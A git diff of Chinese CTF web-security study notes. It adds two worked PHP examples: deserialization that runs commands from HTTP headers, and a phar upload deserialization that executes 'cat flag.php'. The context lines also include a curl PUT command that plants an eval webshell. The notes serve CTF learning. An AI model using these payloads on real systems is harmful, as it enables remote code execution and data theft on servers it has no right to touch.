@@ -748,7 +748,7 @@ SELECT * FROM users WHERE username='vampire     ';
 - 看到类似 ?id=1 的 url，无论是不是一个正常页面，可以联想到注入（尤其可以联想到伪协议）
 - 网页上显示的未必是真实源码，如果题目过滤了网页中代码没显示的字符，应该联想到网页中代码不真实。寻找真实源码或其他突破口
 - 即便是代码审计的题，也要有看源码和 HTTP headers 的习惯
-- include('index.php') 后的文件未必会显示在前端，只有 echo 后才会显示到前端。（如果使用伪协议，就会显示文件内容，不会把文件当作 php 调用，**读文件应该优先选择伪协议**）
+- include('index.php') 后的文件未必会显示在前端，只有 echo 后才会显示到前端。（如果使用**伪协议**，就会显示文件内容，不会把文件当作 php 调用，**读文件应该优先选择伪协议**）
 - 使用 include 包含文件时，如果不显示文件内容，记得使用伪协议。伪协议往往是 `php://` 开头，如果正则表达式只允许 `php` 开头，首先想到伪协议 
 - 看到 PHP 返回内容是 HTTP Headers，可以联想到 %00截断
 - 如果服务器开放了 HTTP PUT 方法，可以使用  `curl -X PUT -d '<?php eval(@$_POST['a']); ?>' http://x/b.php` 注入 `b.php` 文件（如果没有任何安全设置，**'PUT请求用于更新资源，如果资源不存在，可能会创建新的资源'** 这个原则会写入文件到服务端【真实场景几乎不会遇到此漏洞】）
@@ -787,6 +787,57 @@ SELECT * FROM users WHERE username='vampire     ';
   写入文件的命令  `ls > 1.txt`  用  `ls | tee 1.txt`  替代。其中 `>` 是覆盖写入，`tee` 是追加写入
 
 - 如果 127.0.0.1 被过滤，可以使用 sudo.cc 替代。127.0.0.1 还可以写成 127.1    。http://0.0.0.0 可以写成 http://0 (上面 SSRF 的短总结写了所以过滤)
+
+##### 特殊情况: Headers 注入 (只允许使用函数注入，且函数内不能有参数)
+
+例题
+
+- 这个正则表达式只允许使用函数，且函数内不能有参数
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+class Test
+{
+    public $value;
+    public function __destruct(){
+        $this->backdoor();
+    }
+    public function backdoor(){
+        if("yu22x"===preg_replace('/;+/',"yu22x",preg_replace("/[A-Za-z_]+\(+|\)/","",$this->value))){
+           eval($this->value."yu22x");
+       }
+    }
+
+}
+unserialize($_GET['pop']);
+```
+
+答案
+
+```php
+<?php
+    class Test
+    {
+        public $value;
+
+    }
+    $a = new Test();
+    $a->value='system(current(getallheaders()));__halt_compiler();';
+    echo serialize($a);
+?>
+```
+
+`system(current(getallheaders()))` 这段的意思是用 system() 执行 HTTP Headers 中的第一个参数的值。(这里只能使用 burp 设置 HTTP Headers，因为要保证该 header 在 HTTP Headers 的第一个位置) 。
+
+`__halt_compiler()` :这个函数会立即停止编译器的执行。这是为了防止服务器执行我们不希望执行的代码，例如 "yu22x"，因为在 `backdoor` 函数中，我们的代码后面会被添加上 "yu22x"。
+
+如图:
+
+![](static/img/headers注入.jpg)
+
+此处的 `x` (键名)无所谓，可以是任意值。
 
 #### 文件漏洞
 
@@ -1709,6 +1760,96 @@ O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
 ###### 绕过特殊情况下的 `===` 判断
 
 如 `if($this->openstack->neutron === $this->openstack->nova)` ， `this->openstack` 本身应该是一个类实例，此时只要保证 `this->openstack = ''` 或   `this->openstack = null` ，那么 `$this->openstack->neutron` 和 `$this->openstack->nova` 的值会自动反显为 `null`，从而绕过 `===`。例题 https://www.ctfer.vip/problem/335
+
+##### 反序列化 phar
+
+- 抓住突破口 `file_get_contents`，只要有该函数就可以触发 phar 中的内容执行
+
+例题:
+
+```php
+<?php
+//flag in flag.php
+error_reporting(0);
+highlight_file(__FILE__);
+class A {
+    public $a;
+
+    public function __destruct()
+    {
+        system($this->a);
+    }
+}
+if(isset($_GET['file'])) {
+    if(strstr($_GET['file'], "flag")) {
+        die("Get out!");
+    }
+    echo file_get_contents($_GET['file']);
+}
+
+if(isset($_FILES['file'])) {
+    mkdir("upload");
+    $uuid = uniqid();
+    $ext = explode(".", $_FILES["file"]["name"]);
+    $ext = end($ext);
+    move_uploaded_file($_FILES['file']['tmp_name'], "upload/".$uuid.".".$ext);
+    echo "Upload Success! FilePath: upload/".$uuid.".".$ext;
+}
+?>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+</head>
+<body>
+<form action="" method="post" enctype="multipart/form-data">
+    <input type="file" name="file" />
+    <input type="submit" value="load" />
+</form>
+</body>
+
+</html>
+[选择文件]未选择任何文件  [upload]
+```
+
+答案:
+
+首先构造 phar
+
+```php
+<?php
+class A {
+    public $a;
+
+    public function __destruct()
+    {
+        system($this->a);
+    }
+}
+
+$a = new A();
+$a->a='cat flag.php';
+//echo serialize($a);
+
+$phar = new Phar("a.phar");
+$phar->startBuffering();
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
+$phar-> addFromString('test.txt','yu22x');
+//$phar->setMetadata($Test);第一步
+
+$phar->setMetadata($a);
+
+$phar->stopBuffering();
+```
+
+选择上传 `a.phar` ，得到 `Upload Success! FilePath: upload/64ed85cc9f747.phar`
+
+然后访问该文件
+
+```
+?file=phar://upload/64ed85cc9f747.phar
+```
+
+即可得到 flag (输出在 html 源码中)
 
 ##### PHP 魔术方法
 
